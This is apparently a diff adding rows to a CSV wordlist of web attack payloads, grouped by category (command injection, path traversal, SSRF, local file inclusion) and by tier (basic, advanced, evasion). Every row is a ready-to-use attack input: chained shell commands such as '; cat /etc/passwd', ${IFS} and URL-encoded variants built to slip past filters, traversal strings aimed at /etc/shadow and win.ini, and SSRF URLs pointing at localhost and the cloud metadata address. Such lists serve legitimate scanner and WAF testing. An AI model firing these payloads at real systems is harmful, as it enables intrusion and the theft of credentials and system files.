+Command Injection,Basic,33,; whoami
+Command Injection,Basic,34,; pwd
+Command Injection,Basic,35,| whoami
+Command Injection,Basic,36,| whoami
+Command Injection,Basic,37,; pwd
+Command Injection,Basic,38,&& uname -a
+Command Injection,Basic,39,;${IFS}ls
+Command Injection,Basic,40,; pwd
+Command Injection,Basic,41,&& uname -a
+Command Injection,Basic,42,; whoami
+Command Injection,Basic,43,| whoami
+Command Injection,Basic,44,; pwd
+Command Injection,Basic,45,; ls
+Command Injection,Basic,46,&& id
+Command Injection,Basic,47,; pwd
+Command Injection,Basic,48,;${IFS}pwd
+Command Injection,Basic,49,;${IFS}pwd
+Command Injection,Basic,50,|$IFScat$IFS/etc/passwd
+Command Injection,Basic,51,|${IFS}cat${IFS}/etc/passwd
+Command Injection,Basic,52,&& id
+Command Injection,Basic,53,;${IFS}whoami
+Command Injection,Basic,54,;${IFS}cat${IFS}/etc/passwd
+Command Injection,Basic,55,&& id
+Command Injection,Basic,56,; pwd
+Command Injection,Basic,57,|${IFS}cat${IFS}/etc/passwd
+Command Injection,Basic,58,; whoami
+Command Injection,Basic,59,; ls
+Command Injection,Basic,60,| cat /etc/passwd
+Command Injection,Advanced,1,&& uname -a
+Command Injection,Advanced,2,| cat /etc/passwd
+Command Injection,Advanced,3,; cat /etc/passwd
+Command Injection,Advanced,4,|${IFS}cat${IFS}/etc/passwd
+Command Injection,Advanced,5,| cat /etc/passwd
+Command Injection,Advanced,6,| whoami
+Command Injection,Advanced,7,; ls
+Command Injection,Advanced,8,;${IFS}ls
+Command Injection,Advanced,9,| whoami
+Command Injection,Advanced,10,| whoami
+Command Injection,Advanced,11,| cat /etc/passwd
+Command Injection,Advanced,12,; ls
+Command Injection,Advanced,13,;${IFS}cat${IFS}/etc/passwd
+Command Injection,Advanced,14,; pwd
+Command Injection,Advanced,15,; whoami
+Command Injection,Advanced,16,;$IFSwhoami
+Command Injection,Advanced,17,&& id
+Command Injection,Advanced,18,&& id
+Command Injection,Advanced,19,&& uname -a
+Command Injection,Advanced,20,;${IFS}cat${IFS}/etc/passwd
+Command Injection,Advanced,21,;${IFS}cat${IFS}/etc/passwd
+Command Injection,Advanced,22,| whoami
+Command Injection,Advanced,23,|${IFS}cat${IFS}/etc/passwd
+Command Injection,Advanced,24,;$IFSpwd
+Command Injection,Advanced,25,;${IFS}whoami
+Command Injection,Advanced,26,; cat /etc/passwd
+Command Injection,Advanced,27,| whoami
+Command Injection,Advanced,28,;$IFSls
+Command Injection,Advanced,29,&& id
+Command Injection,Advanced,30,|${IFS}cat${IFS}/etc/passwd
+Command Injection,Advanced,31,;$IFSpwd
+Command Injection,Advanced,32,&& uname -a
+Command Injection,Advanced,33,; whoami
+Command Injection,Advanced,34,| whoami
+Command Injection,Advanced,35,&&$IFSuname$IFS-a
+Command Injection,Advanced,36,&& id
+Command Injection,Advanced,37,| cat /etc/passwd
+Command Injection,Advanced,38,; cat /etc/passwd
+Command Injection,Advanced,39,&& id
+Command Injection,Advanced,40,;$IFScat$IFS/etc/passwd
+Command Injection,Advanced,41,; ls
+Command Injection,Advanced,42,| whoami
+Command Injection,Advanced,43,&& id
+Command Injection,Advanced,44,&& id
+Command Injection,Advanced,45,|${IFS}whoami
+Command Injection,Advanced,46,; cat /etc/passwd
+Command Injection,Advanced,47,| cat /etc/passwd
+Command Injection,Advanced,48,;${IFS}cat${IFS}/etc/passwd
+Command Injection,Advanced,49,| cat /etc/passwd
+Command Injection,Advanced,50,; pwd
+Command Injection,Advanced,51,| cat /etc/passwd
+Command Injection,Advanced,52,; pwd
+Command Injection,Advanced,53,| whoami
+Command Injection,Advanced,54,; ls
+Command Injection,Advanced,55,; cat /etc/passwd
+Command Injection,Advanced,56,| cat /etc/passwd
+Command Injection,Advanced,57,| cat /etc/passwd
+Command Injection,Advanced,58,; pwd
+Command Injection,Advanced,59,; whoami
+Command Injection,Advanced,60,| cat /etc/passwd
+Command Injection,Evasion,1,&&%20uname%20-a
+Command Injection,Evasion,2,|%20whoami
+Command Injection,Evasion,3,;%20ls
+Command Injection,Evasion,4,&&%20uname%20-a
+Command Injection,Evasion,5,;%20cat%20/etc/passwd
+Command Injection,Evasion,6,;%20ls
+Command Injection,Evasion,7,;%20whoami
+Command Injection,Evasion,8,;%20whoami
+Command Injection,Evasion,9,;%20pwd
+Command Injection,Evasion,10,&&%20uname%20-a
+Command Injection,Evasion,11,&&%20uname%20-a
+Command Injection,Evasion,12,&&$IFSid
+Command Injection,Evasion,13,|%20cat%20/etc/passwd
+Command Injection,Evasion,14,;$%7BIFS%7Dwhoami
+Command Injection,Evasion,15,;$%7BIFS%7Dls
+Command Injection,Evasion,16,|$IFScat$IFS/etc/passwd
+Command Injection,Evasion,17,;%20cat%20/etc/passwd
+Command Injection,Evasion,18,|$%7BIFS%7Dwhoami
+Command Injection,Evasion,19,|%20whoami
+Command Injection,Evasion,20,;%20ls
+Command Injection,Evasion,21,|%20cat%20/etc/passwd
+Command Injection,Evasion,22,|%20cat%20/etc/passwd
+Command Injection,Evasion,23,;%20whoami
+Command Injection,Evasion,24,;%20whoami
+Command Injection,Evasion,25,|%20cat%20/etc/passwd
+Command Injection,Evasion,26,;%20pwd
+Command Injection,Evasion,27,&&%20id
+Command Injection,Evasion,28,&&%20id
+Command Injection,Evasion,29,|%20whoami
+Command Injection,Evasion,30,|%20whoami
+Command Injection,Evasion,31,;%20whoami
+Command Injection,Evasion,32,;$%7BIFS%7Dpwd
+Command Injection,Evasion,33,;$%7BIFS%7Dls
+Command Injection,Evasion,34,&&$%7BIFS%7Duname$%7BIFS%7D-a
+Command Injection,Evasion,35,;%20whoami
+Command Injection,Evasion,36,&&$%7BIFS%7Duname$%7BIFS%7D-a
+Command Injection,Evasion,37,|%20cat%20/etc/passwd
+Command Injection,Evasion,38,;%20whoami
+Command Injection,Evasion,39,|%20cat%20/etc/passwd
+Command Injection,Evasion,40,|%20cat%20/etc/passwd
+Command Injection,Evasion,41,&&$%7BIFS%7Duname$%7BIFS%7D-a
+Command Injection,Evasion,42,|%20cat%20/etc/passwd
+Command Injection,Evasion,43,|%20cat%20/etc/passwd
+Command Injection,Evasion,44,;%20pwd
+Command Injection,Evasion,45,&&%20uname%20-a
+Command Injection,Evasion,46,;%20whoami
+Command Injection,Evasion,47,|$%7BIFS%7Dcat$%7BIFS%7D/etc/passwd
+Command Injection,Evasion,48,;$IFSls
+Command Injection,Evasion,49,&&%20uname%20-a
+Command Injection,Evasion,50,;%20pwd
+Command Injection,Evasion,51,|%20cat%20/etc/passwd
+Command Injection,Evasion,52,&&$IFSuname$IFS-a
+Command Injection,Evasion,53,|%20cat%20/etc/passwd
+Command Injection,Evasion,54,;%20ls
+Command Injection,Evasion,55,&&$%7BIFS%7Duname$%7BIFS%7D-a
+Command Injection,Evasion,56,;$IFSpwd
+Command Injection,Evasion,57,;%20whoami
+Command Injection,Evasion,58,&&$%7BIFS%7Did
+Command Injection,Evasion,59,&&%20uname%20-a
+Command Injection,Evasion,60,&&%20uname%20-a
+Path Traversal,Basic,1,..\..\windows\win.ini
+Path Traversal,Basic,2,../../../../etc/passwd
+Path Traversal,Basic,3,../../../../etc/passwd
+Path Traversal,Basic,4,../boot.ini
+Path Traversal,Basic,5,../boot.ini
+Path Traversal,Basic,6,../../../../etc/passwd
+Path Traversal,Basic,7,..\..\windows\win.ini
+Path Traversal,Basic,8,../../etc/passwd
+Path Traversal,Basic,9,../etc/shadow
+Path Traversal,Basic,10,../../../../etc/passwd
+Path Traversal,Basic,11,../../etc/passwd
+Path Traversal,Basic,12,../boot.ini
+Path Traversal,Basic,13,../etc/shadow
+Path Traversal,Basic,14,../../../../../etc/passwd
+Path Traversal,Basic,15,../../../etc/passwd
+Path Traversal,Basic,16,..\..\windows\win.ini
+Path Traversal,Basic,17,..\..\..\..\..\windows\win.ini
+Path Traversal,Basic,18,..\..\windows\win.ini
+Path Traversal,Basic,19,../../../../windows/system32/drivers/etc/hosts
+Path Traversal,Basic,20,../../etc/passwd
+Path Traversal,Basic,21,..\..\..\..\..\windows\win.ini
+Path Traversal,Basic,22,../../../../etc/passwd
+Path Traversal,Basic,23,../etc/passwd
+Path Traversal,Basic,24,../../../etc/passwd
+Path Traversal,Basic,25,..\..\windows\win.ini
+Path Traversal,Basic,26,../../../../windows/system32/drivers/etc/hosts
+Path Traversal,Basic,27,../../etc/passwd
+Path Traversal,Basic,28,../../../../etc/passwd
+Path Traversal,Basic,29,../etc/passwd
+Path Traversal,Basic,30,../boot.ini
+Path Traversal,Basic,31,../../boot.ini
+Path Traversal,Basic,32,../etc/passwd
+Path Traversal,Basic,33,..\..\windows\win.ini
+Path Traversal,Basic,34,../../../../windows/system32/drivers/etc/hosts
+Path Traversal,Basic,35,../../../../etc/passwd
+Path Traversal,Basic,36,../../etc/passwd
+Path Traversal,Basic,37,../../../etc/passwd
+Path Traversal,Basic,38,..\..\windows\win.ini
+Path Traversal,Basic,39,../../../etc/passwd
+Path Traversal,Basic,40,../etc/passwd
+Path Traversal,Basic,41,..\..\..\..\..\windows\win.ini
+Path Traversal,Basic,42,../etc/passwd
+Path Traversal,Basic,43,../../etc/passwd
+Path Traversal,Basic,44,../../../etc/passwd
+Path Traversal,Basic,45,../etc/shadow
+Path Traversal,Basic,46,../../../etc/passwd
+Path Traversal,Basic,47,../boot.ini
+Path Traversal,Basic,48,../../boot.ini
+Path Traversal,Basic,49,../../../../../../../etc/passwd
+Path Traversal,Basic,50,../boot.ini
+Path Traversal,Basic,51,../../../../../../etc/passwd
+Path Traversal,Basic,52,..\..\windows\win.ini
+Path Traversal,Basic,53,../../etc/passwd
+Path Traversal,Basic,54,../../../../../etc/passwd
+Path Traversal,Basic,55,../../../../windows/system32/drivers/etc/hosts
+Path Traversal,Basic,56,..\..\windows\win.ini
+Path Traversal,Basic,57,../../../../../../etc/passwd
+Path Traversal,Basic,58,../../etc/passwd
+Path Traversal,Basic,59,../../../../etc/passwd
+Path Traversal,Basic,60,..\..\..\..\..\windows\win.ini
+Path Traversal,Advanced,1,..\..\..\..\..\windows\win.ini
+Path Traversal,Advanced,2,../../../../../../../windows/system32/drivers/etc/hosts
+Path Traversal,Advanced,3,../../../../etc/shadow
+Path Traversal,Advanced,4,../../../../etc/passwd
+Path Traversal,Advanced,5,../../etc/passwd
+Path Traversal,Advanced,6,../../../../../../etc/passwd
+Path Traversal,Advanced,7,../../../etc/passwd
+Path Traversal,Advanced,8,../../boot.ini
+Path Traversal,Advanced,9,../../../../../etc/passwd
+Path Traversal,Advanced,10,../../boot.ini
+Path Traversal,Advanced,11,../../../../../../etc/passwd
+Path Traversal,Advanced,12,../etc/shadow
+Path Traversal,Advanced,13,../../../../etc/passwd
+Path Traversal,Advanced,14,..\..\windows\win.ini
+Path Traversal,Advanced,15,../../../../../../../windows/system32/drivers/etc/hosts
+Path Traversal,Advanced,16,../../../../../etc/passwd
+Path Traversal,Advanced,17,../etc/passwd
+Path Traversal,Advanced,18,../../../etc/passwd
+Path Traversal,Advanced,19,../boot.ini
+Path Traversal,Advanced,20,../../../etc/passwd
+Path Traversal,Advanced,21,..\..\windows\win.ini
+Path Traversal,Advanced,22,../../../../windows/system32/drivers/etc/hosts
+Path Traversal,Advanced,23,..\..\windows\win.ini
+Path Traversal,Advanced,24,../etc/passwd
+Path Traversal,Advanced,25,../../../../etc/passwd
+Path Traversal,Advanced,26,..\..\windows\win.ini
+Path Traversal,Advanced,27,../../../../etc/passwd
+Path Traversal,Advanced,28,../../etc/passwd
+Path Traversal,Advanced,29,../etc/shadow
+Path Traversal,Advanced,30,../etc/shadow
+Path Traversal,Advanced,31,../../../../etc/passwd
+Path Traversal,Advanced,32,../../../../etc/passwd
+Path Traversal,Advanced,33,../etc/shadow
+Path Traversal,Advanced,34,..\..\windows\win.ini
+Path Traversal,Advanced,35,../../../../etc/passwd
+Path Traversal,Advanced,36,../../../../etc/passwd
+Path Traversal,Advanced,37,../../../../etc/passwd
+Path Traversal,Advanced,38,../../../../windows/system32/drivers/etc/hosts
+Path Traversal,Advanced,39,../etc/passwd
+Path Traversal,Advanced,40,../../../../etc/shadow
+Path Traversal,Advanced,41,../etc/passwd
+Path Traversal,Advanced,42,..\..\windows\win.ini
+Path Traversal,Advanced,43,../etc/passwd
+Path Traversal,Advanced,44,../../../../../../../windows/system32/drivers/etc/hosts
+Path Traversal,Advanced,45,../../../etc/passwd
+Path Traversal,Advanced,46,../../../etc/passwd
+Path Traversal,Advanced,47,../etc/shadow
+Path Traversal,Advanced,48,../../../../../../../windows/system32/drivers/etc/hosts
+Path Traversal,Advanced,49,../../../../windows/system32/drivers/etc/hosts
+Path Traversal,Advanced,50,../../../../etc/passwd
+Path Traversal,Advanced,51,../../../etc/passwd
+Path Traversal,Advanced,52,../../boot.ini
+Path Traversal,Advanced,53,../etc/passwd
+Path Traversal,Advanced,54,../../../../etc/shadow
+Path Traversal,Advanced,55,../../boot.ini
+Path Traversal,Advanced,56,..\..\..\..\..\windows\win.ini
+Path Traversal,Advanced,57,../../../../etc/passwd
+Path Traversal,Advanced,58,../../../../windows/system32/drivers/etc/hosts
+Path Traversal,Advanced,59,../../../../etc/passwd
+Path Traversal,Advanced,60,../boot.ini
+Path Traversal,Evasion,1,..\..\windows\win.ini
+Path Traversal,Evasion,2,../../../etc/passwd
+Path Traversal,Evasion,3,../../etc/passwd
+Path Traversal,Evasion,4,../../../etc/passwd
+Path Traversal,Evasion,5,../../../../../etc/passwd
+Path Traversal,Evasion,6,..\..\..\..\..\windows\win.ini
+Path Traversal,Evasion,7,../etc/passwd
+Path Traversal,Evasion,8,../../../../windows/system32/drivers/etc/hosts
+Path Traversal,Evasion,9,../../etc/passwd
+Path Traversal,Evasion,10,../../../../../../../windows/system32/drivers/etc/hosts
+Path Traversal,Evasion,11,../../../etc/passwd
+Path Traversal,Evasion,12,../../etc/passwd
+Path Traversal,Evasion,13,../../../../etc/passwd
+Path Traversal,Evasion,14,../../../../etc/shadow
+Path Traversal,Evasion,15,../../../../windows/system32/drivers/etc/hosts
+Path Traversal,Evasion,16,../../../../../../../etc/passwd
+Path Traversal,Evasion,17,../../../../../../etc/passwd
+Path Traversal,Evasion,18,../../../../../../etc/passwd
+Path Traversal,Evasion,19,../../../../../etc/passwd
+Path Traversal,Evasion,20,../../../../../../etc/passwd
+Path Traversal,Evasion,21,../../../../etc/passwd
+Path Traversal,Evasion,22,../../../../etc/passwd
+Path Traversal,Evasion,23,../../etc/passwd
+Path Traversal,Evasion,24,../../../../etc/shadow
+Path Traversal,Evasion,25,../../../../etc/shadow
+Path Traversal,Evasion,26,../../../../etc/passwd
+Path Traversal,Evasion,27,../../../etc/passwd
+Path Traversal,Evasion,28,../../../../windows/system32/drivers/etc/hosts
+Path Traversal,Evasion,29,../../../../etc/passwd
+Path Traversal,Evasion,30,../etc/passwd
+Path Traversal,Evasion,31,../../../../windows/system32/drivers/etc/hosts
+Path Traversal,Evasion,32,../etc/shadow
+Path Traversal,Evasion,33,../../../../../../../etc/passwd
+Path Traversal,Evasion,34,../../../../windows/system32/drivers/etc/hosts
+Path Traversal,Evasion,35,../../etc/passwd
+Path Traversal,Evasion,36,../../../../etc/passwd
+Path Traversal,Evasion,37,../etc/shadow
+Path Traversal,Evasion,38,../../boot.ini
+Path Traversal,Evasion,39,../../../../../etc/passwd
+Path Traversal,Evasion,40,../boot.ini
+Path Traversal,Evasion,41,../etc/shadow
+Path Traversal,Evasion,42,../boot.ini
+Path Traversal,Evasion,43,../boot.ini
+Path Traversal,Evasion,44,..\..\windows\win.ini
+Path Traversal,Evasion,45,..\..\..\..\..\windows\win.ini
+Path Traversal,Evasion,46,../etc/shadow
+Path Traversal,Evasion,47,../../../../etc/shadow
+Path Traversal,Evasion,48,../etc/shadow
+Path Traversal,Evasion,49,../../../../../etc/passwd
+Path Traversal,Evasion,50,../../../../windows/system32/drivers/etc/hosts
+Path Traversal,Evasion,51,../boot.ini
+Path Traversal,Evasion,52,../../../../etc/passwd
+Path Traversal,Evasion,53,../etc/passwd
+Path Traversal,Evasion,54,../etc/passwd
+Path Traversal,Evasion,55,../../../../etc/shadow
+Path Traversal,Evasion,56,../../../../../etc/passwd
+Path Traversal,Evasion,57,..\..\windows\win.ini
+Path Traversal,Evasion,58,../../../../windows/system32/drivers/etc/hosts
+Path Traversal,Evasion,59,../etc/shadow
+Path Traversal,Evasion,60,..\..\..\..\..\windows\win.ini
+SSRF,Basic,1,http://[::1]
+SSRF,Basic,2,http://[::1]
+SSRF,Basic,3,http://[::1]
+SSRF,Basic,4,http://127.0.0.1
+SSRF,Basic,5,http://[::1]
+SSRF,Basic,6,http://0.0.0.0
+SSRF,Basic,7,http://localhost
+SSRF,Basic,8,http://[::1]
+SSRF,Basic,9,http://127.0.0.1
+SSRF,Basic,10,http://[::1]
+SSRF,Basic,11,http://0.0.0.0
+SSRF,Basic,12,http://[::1]
+SSRF,Basic,13,http://0.0.0.0
+SSRF,Basic,14,http://[::1]
+SSRF,Basic,15,http://169.254.169.254
+SSRF,Basic,16,http://169.254.169.254
+SSRF,Basic,17,http://[::1]
+SSRF,Basic,18,http://127.0.0.1
+SSRF,Basic,19,http://0.0.0.0
+SSRF,Basic,20,http://169.254.169.254
+SSRF,Basic,21,http://localhost
+SSRF,Basic,22,http://[::1]
+SSRF,Basic,23,http://0.0.0.0
+SSRF,Basic,24,http://169.254.169.254
+SSRF,Basic,25,http://169.254.169.254
+SSRF,Basic,26,http://0.0.0.0
+SSRF,Basic,27,http://localhost
+SSRF,Basic,28,http://[::1]
+SSRF,Basic,29,http://[::1]
+SSRF,Basic,30,http://[::1]
+SSRF,Basic,31,http://[::1]
+SSRF,Basic,32,http://127.0.0.1
+SSRF,Basic,33,http://[::1]
+SSRF,Basic,34,http://[::1]
+SSRF,Basic,35,http://169.254.169.254
+SSRF,Basic,36,http://[::1]
+SSRF,Basic,37,http://127.0.0.1
+SSRF,Basic,38,http://localhost
+SSRF,Basic,39,http://[::1]
+SSRF,Basic,40,http://[::1]
+SSRF,Basic,41,http://127.0.0.1
+SSRF,Basic,42,http://0.0.0.0
+SSRF,Basic,43,http://169.254.169.254
+SSRF,Basic,44,http://169.254.169.254
+SSRF,Basic,45,http://[::1]
+SSRF,Basic,46,http://169.254.169.254
+SSRF,Basic,47,http://169.254.169.254
+SSRF,Basic,48,http://169.254.169.254
+SSRF,Basic,49,http://127.0.0.1
+SSRF,Basic,50,http://127.0.0.1
+SSRF,Basic,51,http://[::1]
+SSRF,Basic,52,http://0.0.0.0
+SSRF,Basic,53,http://169.254.169.254
+SSRF,Basic,54,http://127.0.0.1
+SSRF,Basic,55,http://[::1]
+SSRF,Basic,56,http://localhost
+SSRF,Basic,57,http://0.0.0.0
+SSRF,Basic,58,http://127.0.0.1
+SSRF,Basic,59,http://[::1]
+SSRF,Basic,60,http://0.0.0.0
+SSRF,Advanced,1,http://localhost
+SSRF,Advanced,2,http://127.0.0.1
+SSRF,Advanced,3,http://localhost
+SSRF,Advanced,4,http://0.0.0.0
+SSRF,Advanced,5,http://localhost
+SSRF,Advanced,6,http://[::1]
+SSRF,Advanced,7,http://0.0.0.0
+SSRF,Advanced,8,http://169.254.169.254
+SSRF,Advanced,9,http://localhost
+SSRF,Advanced,10,http://[::1]
+SSRF,Advanced,11,http://127.0.0.1
+SSRF,Advanced,12,http://0.0.0.0
+SSRF,Advanced,13,http://0.0.0.0
+SSRF,Advanced,14,http://localhost
+SSRF,Advanced,15,http://[::1]
+SSRF,Advanced,16,http://127.0.0.1
+SSRF,Advanced,17,http://[::1]
+SSRF,Advanced,18,http://127.0.0.1
+SSRF,Advanced,19,http://[::1]
+SSRF,Advanced,20,http://[::1]
+SSRF,Advanced,21,http://localhost
+SSRF,Advanced,22,http://127.0.0.1
+SSRF,Advanced,23,http://127.0.0.1
+SSRF,Advanced,24,http://0.0.0.0
+SSRF,Advanced,25,http://0.0.0.0
+SSRF,Advanced,26,http://169.254.169.254
+SSRF,Advanced,27,http://0.0.0.0
+SSRF,Advanced,28,http://localhost
+SSRF,Advanced,29,http://localhost
+SSRF,Advanced,30,http://0.0.0.0
+SSRF,Advanced,31,http://127.0.0.1
+SSRF,Advanced,32,http://169.254.169.254
+SSRF,Advanced,33,http://[::1]
+SSRF,Advanced,34,http://[::1]
+SSRF,Advanced,35,http://[::1]
+SSRF,Advanced,36,http://169.254.169.254
+SSRF,Advanced,37,http://0.0.0.0
+SSRF,Advanced,38,http://169.254.169.254
+SSRF,Advanced,39,http://127.0.0.1
+SSRF,Advanced,40,http://169.254.169.254
+SSRF,Advanced,41,http://169.254.169.254
+SSRF,Advanced,42,http://127.0.0.1
+SSRF,Advanced,43,http://localhost
+SSRF,Advanced,44,http://169.254.169.254
+SSRF,Advanced,45,http://127.0.0.1
+SSRF,Advanced,46,http://169.254.169.254
+SSRF,Advanced,47,http://169.254.169.254
+SSRF,Advanced,48,http://localhost
+SSRF,Advanced,49,http://127.0.0.1
+SSRF,Advanced,50,http://[::1]
+SSRF,Advanced,51,http://127.0.0.1
+SSRF,Advanced,52,http://0.0.0.0
+SSRF,Advanced,53,http://0.0.0.0
+SSRF,Advanced,54,http://0.0.0.0
+SSRF,Advanced,55,http://localhost
+SSRF,Advanced,56,http://0.0.0.0
+SSRF,Advanced,57,http://0.0.0.0
+SSRF,Advanced,58,http://0.0.0.0
+SSRF,Advanced,59,http://169.254.169.254
+SSRF,Advanced,60,http://localhost
+SSRF,Evasion,1,http://127.0.0.1
+SSRF,Evasion,2,http://[::1]
+SSRF,Evasion,3,http://0.0.0.0
+SSRF,Evasion,4,http://0.0.0.0
+SSRF,Evasion,5,http://169.254.169.254
+SSRF,Evasion,6,http://localhost
+SSRF,Evasion,7,http://127.0.0.1
+SSRF,Evasion,8,http://169.254.169.254
+SSRF,Evasion,9,http://127.0.0.1
+SSRF,Evasion,10,http://localhost
+SSRF,Evasion,11,http://127.0.0.1
+SSRF,Evasion,12,http://0.0.0.0
+SSRF,Evasion,13,http://[::1]
+SSRF,Evasion,14,http://127.0.0.1
+SSRF,Evasion,15,http://0.0.0.0
+SSRF,Evasion,16,http://169.254.169.254
+SSRF,Evasion,17,http://169.254.169.254
+SSRF,Evasion,18,http://127.0.0.1
+SSRF,Evasion,19,http://169.254.169.254
+SSRF,Evasion,20,http://127.0.0.1
+SSRF,Evasion,21,http://127.0.0.1
+SSRF,Evasion,22,http://0.0.0.0
+SSRF,Evasion,23,http://localhost
+SSRF,Evasion,24,http://[::1]
+SSRF,Evasion,25,http://[::1]
+SSRF,Evasion,26,http://[::1]
+SSRF,Evasion,27,http://0.0.0.0
+SSRF,Evasion,28,http://[::1]
+SSRF,Evasion,29,http://0.0.0.0
+SSRF,Evasion,30,http://0.0.0.0
+SSRF,Evasion,31,http://0.0.0.0
+SSRF,Evasion,32,http://localhost
+SSRF,Evasion,33,http://[::1]
+SSRF,Evasion,34,http://127.0.0.1
+SSRF,Evasion,35,http://0.0.0.0
+SSRF,Evasion,36,http://0.0.0.0
+SSRF,Evasion,37,http://localhost
+SSRF,Evasion,38,http://127.0.0.1
+SSRF,Evasion,39,http://169.254.169.254
+SSRF,Evasion,40,http://127.0.0.1
+SSRF,Evasion,41,http://0.0.0.0
+SSRF,Evasion,42,http://[::1]
+SSRF,Evasion,43,http://169.254.169.254
+SSRF,Evasion,44,http://169.254.169.254
+SSRF,Evasion,45,http://0.0.0.0
+SSRF,Evasion,46,http://127.0.0.1
+SSRF,Evasion,47,http://0.0.0.0
+SSRF,Evasion,48,http://[::1]
+SSRF,Evasion,49,http://0.0.0.0
+SSRF,Evasion,50,http://localhost
+SSRF,Evasion,51,http://[::1]
+SSRF,Evasion,52,http://0.0.0.0
+SSRF,Evasion,53,http://0.0.0.0
+SSRF,Evasion,54,http://[::1]
+SSRF,Evasion,55,http://127.0.0.1
+SSRF,Evasion,56,http://localhost
+SSRF,Evasion,57,http://[::1]
+SSRF,Evasion,58,http://127.0.0.1
+SSRF,Evasion,59,http://127.0.0.1
+SSRF,Evasion,60,http://169.254.169.254
+Local File Inclusion,Basic,1,../etc/passwd
+Local File Inclusion,Basic,2,../boot.ini
+Local File Inclusion,Basic,3,../../../../../../../windows/win.ini
+Local File Inclusion,Basic,4,../../../../etc/passwd
+Local File Inclusion,Basic,5,../../../../windows/win.ini
+Local File Inclusion,Basic,6,../boot.ini
+Local File Inclusion,Basic,7,../../../../etc/passwd
+Local File Inclusion,Basic,8,../../../../etc/passwd
+Local File Inclusion,Basic,9,../../../../../../../etc/passwd
+Local File Inclusion,Basic,10,../../../../windows/win.ini
+Local File Inclusion,Basic,11,../../../../windows/win.ini
+Local File Inclusion,Basic,12,../boot.ini
+Local File Inclusion,Basic,13,../../../../etc/passwd
+Local File Inclusion,Basic,14,../../../../windows/win.ini
+Local File Inclusion,Basic,15,../../../../windows/win.ini
+Local File Inclusion,Basic,16,../../boot.ini
+Local File Inclusion,Basic,17,../../../../etc/passwd
+Local File Inclusion,Basic,18,../boot.ini
+Local File Inclusion,Basic,19,../../../../../../../etc/passwd
+Local File Inclusion,Basic,20,../../../../etc/passwd
+Local File Inclusion,Basic,21,../../../../etc/passwd
+Local File Inclusion,Basic,22,../../../../etc/passwd
+Local File Inclusion,Basic,23,../../../../etc/passwd
+Local File Inclusion,Basic,24,../../../../etc/passwd
+Local File Inclusion,Basic,25,../../../../windows/win.ini
+Local File Inclusion,Basic,26,../../../../etc/passwd
+Local File Inclusion,Basic,27,../../../../windows/win.ini
+Local File Inclusion,Basic,28,../../../../etc/passwd
+Local File Inclusion,Basic,29,../../../../../../../windows/win.ini
+Local File Inclusion,Basic,30,../../boot.ini
+Local File Inclusion,Basic,31,../../../../etc/passwd
+Local File Inclusion,Basic,32,../../../../../../../etc/passwd
+Local File Inclusion,Basic,33,../../boot.ini
+Local File Inclusion,Basic,34,../etc/passwd
+Local File Inclusion,Basic,35,../../../../../../../etc/passwd
+Local File Inclusion,Basic,36,../etc/passwd
+Local File Inclusion,Basic,37,../../boot.ini
+Local File Inclusion,Basic,38,../../../../../../../etc/passwd
+Local File Inclusion,Basic,39,../../../../../../../etc/passwd
+Local File Inclusion,Basic,40,../../../../etc/passwd
+Local File Inclusion,Basic,41,../../../../etc/passwd
+Local File Inclusion,Basic,42,../../../../windows/win.ini
+Local File Inclusion,Basic,43,../../../../windows/win.ini
+Local File Inclusion,Basic,44,../boot.ini
+Local File Inclusion,Basic,45,../etc/passwd
+Local File Inclusion,Basic,46,../../boot.ini
+Local File Inclusion,Basic,47,../../../../etc/passwd
+Local File Inclusion,Basic,48,../../../../../../../windows/win.ini
+Local File Inclusion,Basic,49,../../../../etc/passwd
+Local File Inclusion,Basic,50,../../../../windows/win.ini
+Local File Inclusion,Basic,51,../../../../windows/win.ini
+Local File Inclusion,Basic,52,../../../../etc/passwd
+Local File Inclusion,Basic,53,../../../../../../../windows/win.ini
+Local File Inclusion,Basic,54,../../../../etc/passwd
+Local File Inclusion,Basic,55,../boot.ini
+Local File Inclusion,Basic,56,../etc/passwd
+Local File Inclusion,Basic,57,../../../../windows/win.ini
+Local File Inclusion,Basic,58,../../../../windows/win.ini
+Local File Inclusion,Basic,59,../../../../../../../windows/win.ini
+Local File Inclusion,Basic,60,../../../../windows/win.ini
+Local File Inclusion,Advanced,1,../etc/passwd
+Local File Inclusion,Advanced,2,../etc/passwd
+Local File Inclusion,Advanced,3,../../../../etc/passwd
+Local File Inclusion,Advanced,4,../../../../windows/win.ini
+Local File Inclusion,Advanced,5,../../../../etc/passwd
+Local File Inclusion,Advanced,6,../../../../etc/passwd
+Local File Inclusion,Advanced,7,../../../../../../../windows/win.ini
+Local File Inclusion,Advanced,8,../../boot.ini
+Local File Inclusion,Advanced,9,../../../../etc/passwd
+Local File Inclusion,Advanced,10,../boot.ini
+Local File Inclusion,Advanced,11,../../boot.ini
+Local File Inclusion,Advanced,12,../boot.ini
+Local File Inclusion,Advanced,13,../etc/passwd
+Local File Inclusion,Advanced,14,../../boot.ini
+Local File Inclusion,Advanced,15,../boot.ini
+Local File Inclusion,Advanced,16,../etc/passwd
+Local File Inclusion,Advanced,17,../boot.ini
+Local File Inclusion,Advanced,18,../etc/passwd
+Local File Inclusion,Advanced,19,../../../../etc/passwd
+Local File Inclusion,Advanced,20,../../boot.ini
+Local File Inclusion,Advanced,21,../boot.ini
+Local File Inclusion,Advanced,22,../../../../etc/passwd
+Local File Inclusion,Advanced,23,../../../../windows/win.ini
+Local File Inclusion,Advanced,24,../../../../etc/passwd
+Local File Inclusion,Advanced,25,../../../../etc/passwd
+Local File Inclusion,Advanced,26,../../../../../../../windows/win.ini
+Local File Inclusion,Advanced,27,../../../../../../../etc/passwd
+Local File Inclusion,Advanced,28,../../../../../../../etc/passwd
+Local File Inclusion,Advanced,29,../../../../../../../windows/win.ini
+Local File Inclusion,Advanced,30,../boot.ini
+Local File Inclusion,Advanced,31,../etc/passwd
+Local File Inclusion,Advanced,32,../../../../etc/passwd
+Local File Inclusion,Advanced,33,../../../../etc/passwd
+Local File Inclusion,Advanced,34,../../../../etc/passwd
+Local File Inclusion,Advanced,35,../boot.ini
+Local File Inclusion,Advanced,36,../../../../etc/passwd
+Local File Inclusion,Advanced,37,../boot.ini
+Local File Inclusion,Advanced,38,../../../../etc/passwd
+Local File Inclusion,Advanced,39,../../../../../../../etc/passwd
+Local File Inclusion,Advanced,40,../../../../../../../etc/passwd
+Local File Inclusion,Advanced,41,../etc/passwd
+Local File Inclusion,Advanced,42,../../../../etc/passwd
+Local File Inclusion,Advanced,43,../../../../windows/win.ini
+Local File Inclusion,Advanced,44,../etc/passwd
+Local File Inclusion,Advanced,45,../boot.ini
+Local File Inclusion,Advanced,46,../boot.ini
